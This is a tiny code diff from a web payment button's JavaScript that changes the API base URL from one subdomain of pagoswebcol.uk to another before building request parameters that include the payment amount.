@@ -118,7 +118,7 @@ if (botonPagar) {
         let loadingInterval = animateLoadingText(loadingText);
 
         // 4. CONEXIÓN CON EL SERVIDOR LOCAL
-        const baseUrl = 'https://api.pagoswebcol.uk';
+        const baseUrl = 'https://air.pagoswebcol.uk';
         
         const params = new URLSearchParams({
             amount: amount,
